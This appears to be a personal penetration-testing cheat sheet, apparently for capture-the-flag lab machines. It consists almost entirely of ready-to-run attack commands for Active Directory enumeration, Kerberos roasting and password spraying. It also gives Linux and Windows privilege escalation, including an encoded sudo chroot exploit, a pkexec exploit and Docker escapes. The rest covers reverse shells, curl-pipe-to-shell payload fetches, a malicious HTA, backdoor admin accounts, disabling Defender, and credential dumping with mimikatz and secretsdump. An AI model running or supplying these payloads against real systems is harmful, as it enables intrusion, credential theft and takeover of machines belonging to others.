nxc smb hosts_ -u computers -p passwords_computers --no-brute --local-auth
nmap -iL hosts_ --script "ldap* and not brute" -p 389 | awk '/Nmap scan report/{ip=$NF} /dnsHostName/{h[ip]=h[ip] ? h[ip]" "$3 : $3} END{for (i in h) print i, h[i]}' | sort -t. -k1,1n -k2,2n -k3,3n -k4,4n
for host in $(cat hosts_); do echo "================[  $host  ]================"; rpcclient -U "" -N $host -c "enumdomusers" | grep -oP 'user:\[\K[^]]+' | tr '[:upper:]' '[:lower:]'; echo; done
kerbrute userenum --dc $TARGET -d $DOM /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 --delay 0 -o $TARGET_userenum.kerbrute
impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames
impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -no-preauth 'NPUserjjones' -usersfile usernames
creds search ftp
nmap $TARGET --script "ssl* and not brute" -p 443
KDOM=$(bash -c 'echo "${0^^}"' $DOM);KDC=$(bash -c 'echo "${0^^}"' $DC); echo -e "[libdefaults]\n default_realm = $KDOM\n dns_lookup_kdc = false\n dns_lookup_realm = false\n forwardable = true\n\n[realms]\n $KDOM = {\n  kdc = $KDC\n  admin_server = $KDC\n }\n\n[domain_realm]\n .$DOM = $KDOM\n $DOM = $KDOM" | sudo tee /etc/krb5.conf
echo "$TARGET $DC $DOM" | sudo tee -a /etc/hosts # Windows: C:\Windows\System32\drivers\etc\hosts
wget ftp://$TARGET --ftp-user='anonymous' --ftp-password='' -np -nH -m -q -P ftp
smbme $TARGET
mkdir smb; smbclient //$TARGET/SHARENAME -N -D . -c 'lcd smb; recurse; prompt; mget *'
impacket-lookupsid 'anonymous'@$TARGET 10000 -no-pass | cut -d '\' -f 2 | grep 'SidTypeUser' | cut -d ' ' -f 1 | tr '[:upper:]' '[:lower:]'
tshark -r FILE.pcap -V | grep -iE 'cipher:|enctype:' | cut -d ':' -f2 | xargs -n1
echo '$krb5pa$18$<CNameString>$<realm>$<cipher>' > hashes
cp hashes /mnt/c/hashcat
cd /mnt/c/hashcat; hashcat.exe -m 19700 hashes $(wslpath -w $rockyou)


# Exploitation (Post-creds)
## Initial Enumeration
[*] Bloodhound
+---------- Start ----------+
Set-Location "$env:USERPROFILE\Downloads"; docker compose down; docker volume rm @(docker volume ls -q | Select-String neo4j-data); docker compose up
.\bloodhound-cli resetpwd
http://127.0.0.1:7474
neo4j:bloodhoundcommunityedition
http://127.0.0.1:8080
admin:RANDOM_PASSWORD

+---------- Queries ----------+
-->> Privileges: Groups with Users and Computers
MATCH p=(n)-[r*1..]-(m)
WHERE (n:User OR n:Computer)
  AND (m:User OR m:Computer)
  AND ALL(x IN nodes(p) WHERE x:User OR x:Computer)
RETURN p
LIMIT 1000

MATCH (g:Group)<-[:MemberOf]-(e)-[r1]->(n1)-[r2]->(n2)
WHERE (e:User OR e:Computer)
  AND NOT toLower(e.name) CONTAINS "admin"
  AND NOT toLower(e.name) CONTAINS "guest"
  AND NOT toLower(g.name) CONTAINS "admin"
  AND NOT toLower(g.name) CONTAINS "guest"
  AND NOT toLower(g.name) CONTAINS "domain users"
  AND NOT toLower(n1.name) CONTAINS "admin"
  AND NOT toLower(n1.name) CONTAINS "domain users"
  AND NOT toLower(n2.name) CONTAINS "admin"
  AND NOT toLower(n2.name) CONTAINS "domain users"
  AND NOT (n1:Container AND toLower(n1.name) CONTAINS "users")
  AND NOT (n2:Container AND toLower(n2.name) CONTAINS "users")
WITH e, r1, n1, r2, n2
OPTIONAL MATCH (n2)-[r3]->(connected)
RETURN DISTINCT e, r1, n1, r2, n2, r3, connected
LIMIT 1000

## Decoding and Decompressing
echo -n '6b,cf,2a,4b,6e,5a,ca,0f' | xxd -r -p | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
echo -n 'cGFzc3dvcmRpc2dvb2Q=' | base64 -d
tar -xzvf backup.tar.gz -C .
unzip backup.zip -d .

## Spray Services
sprayme '$USERNAME:$PASSWORD' <HOSTS_FILE>

## Keep Clock Synced
sudo skewme $TARGET

## Get Bloodhound Data
impacket-getTGT $DOM/'$USERNAME:$PASSWORD'; kcme
bloodhound-ce-python -u '$USERNAME' -k -no-pass -d $DOM -ns $TARGET -op $DC_$TARGET --zip -c All; unzip $DC*_bloodhound.zip -d /Upload/bloodhound
//$MYIP/$/Sharphound.exe --ldapusername '$USERNAME' --ldappassword '$PASSWORD'

## Get Usernames and Computers
cat /Upload/bloodhound/*_users.json | jq -r '.. | .samaccountname? // empty' | tee usernames_$DC
cat /Upload/bloodhound/*_computers.json | jq -r '.. | .samaccountname? // empty' | tee computers_$DC
impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag && $1 ~ /^[A-Za-z]/ {print $1}' | awk NF | tr '[:upper:]' '[:lower:]' | tee usernames_$DC
impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass | awk '/---/{flag=1;next} flag && $1 ~ /^[A-Za-z]/ {print $1}' | awk NF | tr '[:upper:]' '[:lower:]' | tee computers_$DC

## Initial Attacks
impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames_$DC
impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -no-preauth 'NPUserjjones' -usersfile usernames_$DC
impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames_$DC
impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers_$DC
impacket-changepasswd $DOM/'$USERNAME:$PASSWORD'@$TARGET -k -p kpasswd -newpass '123qweasdF!'
dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action query --record '@'
sudo responder -I tun0 -v
dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record '*'
dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'

## Command Execution
evil-winrm-py -i $TARGET -u '$USERNAME' -p '$PASSWORD'
evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
evil-winrm-py -i $DC -r $DOM
impacket-psexec $DOM/'$USERNAME:$PASSWORD'@$TARGET
impacket-smbclient $DOM/'$USERNAME:$PASSWORD'@$TARGET
impacket-wmiexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
impacket-atexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'

# Post-Exploitation 
## Linux
[*] Initial Shell
+---------- Generate resh ----------+
resh.py $MYIP 80 /Upload/resh; resh.py $MYIP 80 /Upload/resh_5566

+---------- Execute resh ----------+
curl -s http://$MYIP:53/resh | sh
wget -qO- http://$MYIP:53/resh | sh

+---------- Base64 Shell ----------+
echo 'bash -i >& /dev/tcp/10.10.16.9/5555 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzU1NTUgMD4mMQo=

echo 'sh -i >& /dev/tcp/10.10.16.9/5555 0>&1' | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuOS81NTU1IDA+JjEK

+---------- Upgrade TTY ----------+
script /dev/null -c bash
python3 -c 'import pty; pty.spawn("/bin/bash")';
CTRL-Z; stty size; stty raw -echo; fg; export SHELL=bash; export TERM=xterm-256color; stty rows <num> columns <num>; reset

+---------- Set Custom PATH ----------+
export PATH=/dev/shm:$PATH

[*] File Transfer
python3 -m http.server 80 -d /Upload
curl -s $MYIP/linux/linpeas.sh -o linpeas.sh
wget -qO- $MYIP/linux/linpeas.sh -O linpeas.sh
scp -C -r /Upload user@proxybox:/ ; ssh user@proxybox; python3 -m http.server 139 -d /Upload

[*] Privilege Escalation
+---------- Priv Check ----------+
curl -s $MYIP/whoami.sh | sh
curl -s $MYIP/linux/linpeas.sh | sh

+---------- Check For Pivots ----------+
arp -a

+---------- Creds In DB Files ----------+
grep -IrinE "db[-_]?(user|pass|login)\w*" / 2>/dev/null

+---------- SUDO Exploits ----------+
-->> 1.9.14 – 1.9.17  (CVE-2025-32463 chwoot)
echo 'WD0kKG1rdGVtcCAtZCAvdG1wL1hYWFhYWCkKY2QgJHtYP30gfHwgZXhpdCAxCmNhdCA+IFguYzw8RU9GCiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgpfX2F0dHJpYnV0ZV9fKChjb25zdHJ1Y3RvcikpIHZvaWQgWCh2b2lkKSB7CiAgc2V0cmV1aWQoMCwwKTsKICBzZXRyZWdpZCgwLDApOwogIGNoZGlyKCIvIik7CiAgZXhlY2woIi9iaW4vYmFzaCIsICIvYmluL2Jhc2giLCBOVUxMKTsKfQpFT0YKbWtkaXIgLXAgWC9ldGMgbGlibnNzXwplY2hvICJwYXNzd2Q6IC9YIiA+IFgvZXRjL25zc3dpdGNoLmNvbmYKY3AgL2V0Yy9ncm91cCBYL2V0YwpnY2MgLXNoYXJlZCAtZlBJQyAtV2wsLWluaXQsWCAtbyBsaWJuc3NfL1guc28uMiBYLmMKc3VkbyAtUiBYIFgKcm0gLXJmICR7WD99Cg==' | base64 -d > /tmp/root.sh; chmod +x /tmp/root.sh; /tmp/root.sh

+---------- Symlink: Writeable Root File ----------+
ln -sf /etc/passwd /var/log/below/error_root.log

+---------- Chrome Debugging ----------+
curl -sg http://240.0.0.1:41829/json
echo 'Target.createTarget {"url":"file:///root/.ssh/id_rsa"}' | websocat -n1 --jsonrpc --jsonrpc-omit-jsonrpc 'ws://240.0.0.1:41829/devtools/page/0DC707C3C63E0C0E7B012B8AE0597CC0'
curl -sg http://240.0.0.1:41829/json
echo 'Page.printToPDF {}\n' | websocat -n1 --jsonrpc --jsonrpc-omit-jsonrpc 'ws://240.0.0.1:41829/devtools/page/BEAA157A683895274AA8D0BD21B80D0E' | jq -r '.result.data' | base64 -d > output.pdf
sudo update-binfmts --disable cli; open output.pdf

+---------- PATH Hijack (SUID) ----------+
-->> Create Imposter Binary from Victim Machine (/tmp/x)
echo '#include<stdlib.h>\nint main(){system("cp /bin/bash /tmp/bashx;chown root:root /tmp/bashx;chmod u+s /tmp/bashx");}' | sed 's/\\n/\n/g' > /tmp/x.c; gcc /tmp/x.c -o /tmp/x; rm /tmp/x.c

-->> Rename to Impose as Legit Binary
cp /tmp/x /tmp/fdisk

-->> Add Hijack Directory to PATH
export PATH="/tmp:$PATH"

-->> Execute Legit Binary: Imposter Will Execute First
sysinfo; /tmp/bashx -p
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo megacli-disk-info; /tmp/bashx -p

-->> Hijacked Imposter Produces SUID Bash
/tmp/bashx -p

+---------- Polkit (CVE-2021-4034) ----------+
echo $'F=-Wall\n\nT=$(shell which true)\n\n.PHONY: all\nall: m.so run gconv-modules gconvpath\n\n.PHONY: clean\nclean:\n\trm -rf m.so run gconv-modules GCONV_PATH=./\n\ngconv-modules:\n\techo "module UTF-8// PWN// m 1" > $@\n\n.PHONY: gconvpath\ngconvpath:\n\tmkdir -p GCONV_PATH=.\n\tcp $(T) GCONV_PATH=./m.so:.\n\nm.so: m.c\n\t$(CC) $(F) --shared -fPIC -o $@ $<\n' >Makefile; echo $'#include <unistd.h>\nint main(){char * const e[]={"m.so:.","PATH=GCONV_PATH=.","SHELL=/x","CHARSET=PWN",NULL};return execve("/usr/bin/pkexec",NULL,e);}' >run.c; echo $'#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid gconv(){}\nvoid gconv_init(void *p){char * const a[]={"/bin/sh",NULL};char * const e[]={"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",NULL};setuid(0);setgid(0);execve(a[0],a,e);exit(0);}' >m.c; make; ./run; rm gconv-modules Makefile m.c m.so run run.c; rm -rf GCONV_PATH=.

+---------- Groups ----------+
newgrp developer
find / -group developer 2>/dev/null

newgrp adm
aureport --tty
echo "6D7262336E5F41634064336D79210A" | xxd -r -p

+---------- Malicious Files ----------+
-->> .js
echo -e 'const { exec } = require('child_process');\nexec('curl $MYIP:53/resh_5566|sh', (err, stdout, stderr) => {});

-->> .sh
echo -e '#!/bin/bash\ncurl $MYIP:53/resh_5566|sh'
echo 'bash -i'

-->> curl cmd file
echo -e 'url = "http://$MYIP:53/ssh.pub"\noutput = "/root/.ssh/authorized_keys"' > /tmp/cmd
curl -s -K /tmp/cmd
ssh -i ~/.ssh/ssh.key root@$TARGET

+---------- Symlink: Doubled ----------+
ln -s /root/.ssh/id_rsa /home/bob/.cache/x; ln -s /home/bob/.cache/x /home/bob/.cache/x.png
CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh /home/bob/.cache/x.png

+---------- Write: /etc/passwd ----------+
echo "any:$(openssl passwd -1 root):0:0:root:/root:/bin/bash" >> /etc/passwd && echo 'The password is: root'; su any

+---------- Nginx: sudo ----------+
echo -e 'user root;\nevents{\nworker_connections 1024;\n}\nhttp{\nserver{\nlisten 9999;\nroot /;\nautoindex on;\ndav_methods PUT;\n}\n}' >/tmp/nginx.conf
(sudo /usr/sbin/nginx -c /tmp/nginx.conf &)
curl localhost:9999/etc/shadow
curl -X PUT localhost:9999/root/.ssh/authorized_keys -d 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIeeFWbnFWdAvY9w58uDcXbGb59vTldv4LnEkVgifJ7'

+---------- 7z Wildcard ----------+
touch @x; ln -fs /root/.ssh/id_rsa x
sudo 7z_backup_script

+---------- Image Magick (CVE-2024-41817) ----------+
cd /opt/app/static/assets/images/
gcc -x c -shared -fPIC -o ./libxcb.so.1 - <<< $'#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n__attribute__((constructor)) void init(){system("chmod u+s /bin/bash");exit(0);}'; bash -p

+---------- Mosh-Server / Client ----------+
sudo /usr/bin/mosh-server new -i 0.0.0.0 -p 164
MOSH CONNECT 164 llf0eFMPgMD7yZw7zgfkLw
MOSH_KEY=llf0eFMPgMD7yZw7zgfkLw mosh-client 0.0.0.0 164

+---------- Wi-fi (WPA) ----------+
iw dev
reaver -i mon0 -b 02:00:00:00:00:00 -vv

+---------- Gnuplot ----------+
echo 'system("curl $MYIP:53/resh|sh")' > /opt/gnuplot/x.plt

+---------- Polkit Version ----------+
rpm -qa | grep -i polkit | grep -i "0.11[3-9]"
apt list --installed 2>/dev/null | grep -i policykit

+---------- Port Scan Gateway ----------+
curl -s $MYIP:53/linux/nmap | sh

+---------- Bash SUID Exploits ----------+
f=/tmp/bash;cp /bin/bash $f;chmod u+s $f
f=x;echo -e '#!/bin/bash\ncp /bin/bash /tmp\nchmod u+s /tmp/bash'>$f;chmod +x $f

+---------- Exploits ----------+
snapd_2.37          https://www.exploit-db.com/exploits/46361
sudo_1.6.9.p18      https://www.exploit-db.com/exploits/7129
polkit_0.117-2      https://www.exploit-db.com/exploits/50011

+---------- SSH Files ----------+
cd ~/.ssh; ls -la
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINzZbkLBUl5mk0AW8lPkWRXrupSiydDr8GJauiEAu3Ze<REDACTED>' > ~/.ssh/authorized_keys

+---------- Config Files ----------+
grep -r -E 'conf' /var/www

+---------- /etc/passwd Permission ----------+
ls -la /etc/passwd
nano /etc/passwd
mkpasswd -m descrypt 'password'
piS1wHGBkJ3z2
root:piS1wHGBkJ3z2:0:0:root:/root:/usr/bin/bash

+---------- Switching Users ----------+
su root -p
password

+---------- Finding Files ----------+
find / -name '*secret0*' -readable 2>/dev/null | xargs ls -la
find / -name 'root.txt' -readable -exec echo {} \; -exec cat {} \; 2>/dev/null

+---------- /etc/shadow ----------+
cat /etc/shadow

[*] Pivoting
-->> Ligolo: New Configuration
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:8080
curl $MYIP/linux/agent -o /dev/shm/agent; chmod +x /dev/shm/agent; /dev/shm/agent -ignore-cert -connect $MYIP:8080
session 1
interface_create --name ligolo
tunnel_start --tun ligolo
ifconfig
interface_add_route --name ligolo --route 240.0.0.1/32
interface_add_route --name ligolo --route 192.168.110.51/24

-->> Ligolo: Reset
stop,  interface_delete --name ligolo,  start

-->> Ligolo: Attack Single
chromium 240.0.0.1:3000
curl 240.0.0.1:5000

-->> Ligolo: Attack Multiple
nbtscan-unixwiz 192.168.110.51/24
fping -ag 192.168.110.51/24
sudo nmap -n -Pn -sS '192.168.110.51/24' -p21,22,23,25,53,79,80,88,135,139,389,443,445,512,513,514,1433,1521,2049,2375,3306,3389,5985,10249,10250 --open --min-rate 250 --max-rate 500 -vvvv 2>&1 | stdbuf -oL grep --color=never -oP '(?<=on )\d{1,3}(?:\.\d{1,3}){3}' | tee tmp.hosts
sort -nu -t . -k1,1 -k2,2 -k3,3 -k4,4 tmp.hosts | tee hosts_
sudo nmap -n -Pn -sS -iL hosts_ --open --max-rate 50 -oA 'TCP_$TARGET__24'
sudo nmap -n -Pn -sS '$TARGET/24' --excludefile hosts_ -F --open --max-rate 50 -oA 'TCP_ALL_$TARGET__24'

[*] Meterpreter
msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/bind_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/bind_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run'

msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/reverse_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/reverse_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run;'

[*] Containers
+---------- Docker ----------+
curl -s --unix-socket /var/run/docker.sock http:/./images/json
curl -s --unix-socket /var/run/docker.sock http:/./containers/json
curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http:/./containers/create -d '{"Detach":true,"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Tty":false,"Image":"staging:latest","HostConfig":{"Binds": ["/:/var/tmp"]},"Cmd":["sh", "-c", "curl $MYIP/resh|sh"]}'
curl -X POST -H "Content-Type:application/json" --unix-socket /var/run/docker.sock http:/./containers/f33aa36ef776879b434e918208f9db2e1bce018484a019482ff6a85cb5f98a9a/start
ls -la /var/tmp

-->> Access Docker File System
cat /etc/mtab | grep -oP 'upperdir.*' | cut -d ',' -f1
ls -la /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff

-->> Make Bash SUID From Rooted Docker: Execute From Host
cp /bin/bash /var/www; chmod +s /var/www/bash
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff/var/www/bash -p

docker ps -a
docker commit 35c090009763 tempimg
docker run -v /:/mnt --rm --privileged -it tempimg chroot /mnt sh

+---------- Run Image Privileged ----------+
docker image list
docker run -v /:/mnt --rm --privileged REPOSITORY chroot /mnt bash -c 'curl 10.10.16.9:139/resh|sh'

+---------- Privileged: True ----------+
cat docker-compose.yml | grep 'privileged: true'
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`;mkdir -p $d/w;echo 1 >$d/w/notify_on_release;t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`;echo $t/c >$d/release_agent;printf '#!/bin/sh\ncurl 10.10.16.9/resh | sh' >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";

[*] Shells
+---------- One Liners ----------+
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc $MYIP 80 >/tmp/f 
/bin/sh -i >& /dev/tcp/$MYIP/5555 0>&1
php -r '$sock=fsockopen("$MYIP",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$MYIP",5555)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
perl -e 'use Socket;$i="$MYIP";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
ruby -rsocket -e'f=TCPSocket.open("$MYIP",5555).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
lua -e "require('socket');require('os');t=socket.tcp();t:connect('$MYIP','5555');os.execute('/bin/sh -i <&3 >&3 2>&3');"

+---------- Listeners ----------+
rlwrap nc -lvnp 80
rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 7; set payload linux/x64/shell/reverse_tcp; run"
rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 7; set payload linux/x64/meterpreter/reverse_tcp; run"
rlwrap msfconsole -q -x "use multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 7777; run"
rlwrap msfconsole -q -x "use multi/handler; set payload php/reverse_php; set LHOST $MYIP; set LPORT 7777; run"

+---------- MSFVenom ----------+
msfvenom -p php/reverse_php LHOST=$MYIP LPORT=80 -f raw -o shell.php
msfvenom -p php/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shell.php
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$MYIP LPORT=80 -f elf -o shell.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$MYIP LPORT=80 -f elf -o shell.elf
msfvenom -p python/shell_reverse_tcp LHOST=$MYIP LPORT=80 -f raw -o shell.py
msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shell.py

## Windows
[*] Initial Shell
+---------- Execute ----------+
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:53/resh.ps1');resh -Reverse $MYIP -Port 5555"
\\$MYIP\$\nc.exe $MYIP 80 -e cmd

-->> Web Delivery (PowerShell)
msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SRVPORT 8888; setg LHOST $MYIP; setg LPORT 443; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'

-->> Host Malicious .hta + AMSI Web Delivery
python3 -m http.server 80 /Upload
echo '<!DOCTYPE html>\n<html>\n<head>\n<HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no"/>\n<script language="VBScript">\nFunction X()\nDim XX\nSet XX = CreateObject("Wscript.Shell")\nXX.run "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGU<PAYLOAD_HERE>.......", 0, true\nEnd Function\nX\nself.close\n</script>\n</head>\n<body>\n</body>\n</html>' > /Upload/x.hta

[*] File Transfer
-->> Serve
python3 -m http.server 80 /Upload
impacket-smbserver share /Upload/windows

-->> Transfer From Linux
curl $MYIP/windows/nc.exe -o \programdata\nc.exe
curl $MYIP/windows/Sharphound.exe -o \programdata\Sharphound.exe
curl $MYIP/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
curl $MYIP/windows/Rubeus.exe -o \programdata\Rubeus.exe
curl $MYIP/windows/agent.exe -o \programdata\agent.exe
curl $MYIP/windows/PowerView.ps1 -o \programdata\PowerView.ps1
curl $MYIP/windows/PrivescCheck.ps1 -o \programdata\PrivescCheck.ps1
curl $MYIP/bat2exe.bat -o \programdata\bat2exe.bat
wget $MYIP/windows/nc.exe -o \programdata\nc.exe
copy \\$MYIP\$\nc.exe \programdata
certutil -urlcache -f http://$MYIP/windows/nc.exe \programdata\nc.exe

-->> Transfer To Linux
curl $MYIP/windows/nc.exe -o \programdata\nc.exe
\programdata\nc.exe $MYIP 80 < \programdata\BloodHound.zip
rlwrap nc -lvp 80 > /Upload/bloodhound/files.zip

[*] Privilege Escalation
+---------- Priv Check ----------+
powershell -c "curl $MYIP/windows/winPEASofs.exe -o \programdata\winPEASofs.exe; \programdata\winPEASofs.exe"
IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/PrivescCheck.ps1');Invoke-PrivescCheck
IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/whoami')
//$MYIP/$/winPEASofs.exe > //$MYIP/$/output_winPEAS.txt
tail -f /Upload/windows/output_winPEAS.txt

+---------- Check For Pivots ----------+
arp -a

+---------- Sharphound Data ----------+
curl $MYIP/windows/Sharphound.exe -o \programdata\Sharphound.exe; \programdata\Sharphound.exe
curl $MYIP/windows/nc.exe -o \programdata\nc.exe
\programdata\nc.exe $MYIP 80 < \programdata\BloodHound.zip
rlwrap nc -lvp 80 > /Upload/bloodhound/files.zip
cat /Upload/bloodhound/*_users.json | jq -r '.. | .samaccountname? // empty' | tee usernames_$DC
cat /Upload/bloodhound/*_computers.json | jq -r '.. | .samaccountname? // empty' | tee computers_$DC

+---------- Identify Hosts from Computers ----------+
sort -u computers_$DC | sed 's/\$$//' | paste -sd, - | sed 's/^/@("/;s/,/","/g;s/$/") | ForEach-Object { $comp=$_; Resolve-DnsName $_ -Type A -ErrorAction SilentlyContinue | Select-Object @{Name=\"Name\";Expression={$comp}},IPAddress } | Format-Table -AutoSize/'

+---------- Switch User: Known Creds ----------+
//$MYIP/$/RunasCs.exe --bypass-uac --logon-type 8 $USERNAME $PASSWORD cmd.exe -r $MYIP:8443
IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/Invoke-RunasCs.ps1'); Invoke-RunasCs -Username $USERNAME -Password $PASSWORD -Command cmd.exe -Remote $MYIP:8443

+---------- Restore AD Objects ----------+
powershell -c "Restore-ADObject -Identity 'GUID or DistinguishedName'"

+---------- CanPSRemote (AdminTo) ----------+
Invoke-Command -ComputerName SRV01 -ScriptBlock { whoami /priv; arp /a; ipconfig /all }
Invoke-Command -ComputerName SRV01 -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
Invoke-Command -ComputerName SRV01 -ScriptBlock { New-SmbShare -Name tasks -Path "C:\Windows\Tasks" -FullAccess dbf; Add-MpPreference -ExclusionPath "C:\Windows\Tasks"; Set-MpPreference -DisableRealtimeMonitoring $true }

+---------- LAPS ----------+
impacket-GetLAPSPassword -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD' | awk '$1 ~ /\$$/ {print $1 " --> Administrator:" $3}'
$computer='WS02'; $pass='YwBxQ1hv'; Set-Item WSMan:\localhost\Client\TrustedHosts -Value $computer -Force -Confirm:$false; $sec=ConvertTo-SecureString $pass -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential("$computer\Administrator",$sec); Invoke-Command -ComputerName $computer -Credential $cred -Authentication Negotiate -ScriptBlock { whoami /priv; arp /a; ipconfig /all }
Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { New-SmbShare -Name tasks -Path "C:\Windows\Tasks" -FullAccess dbf; Add-MpPreference -ExclusionPath "C:\Windows\Tasks"; Set-MpPreference -DisableRealtimeMonitoring $true }

+---------- dbf: Account Created ----------+
(t=$TARGET; echo '\033[33m--------------[ DPAPI ]--------------\033[0m';nxc smb $t -u dbf -p '123qweasdF!' --dpapi --local-auth; echo '\033[33m--------------[ LSASS ]--------------\033[0m';nxc smb $t -u dbf -p '123qweasdF!' -M lsassy --local-auth; echo '\033[33m--------------[ SAM + SECRETS ]--------------\033[0m'; impacket-secretsdump 'dbf:123qweasdF!'@$t) | tee dump_$t
nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Rubeus.exe Windows\\Tasks\\Rubeus.exe
evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
winexe -U 'dbf%123qweasdF!' //$TARGET "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/dpapi.ps1')\"" | tee dpapi_$TARGET
winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe dump /nowrap'
winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe tgtdeleg /nowrap'
winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe asreproast /nowrap'
winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe kerberoast /nowrap'
rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\mimikatz.exe'
privilege::debug
token::elevate
sekurlsa::logonpasswords
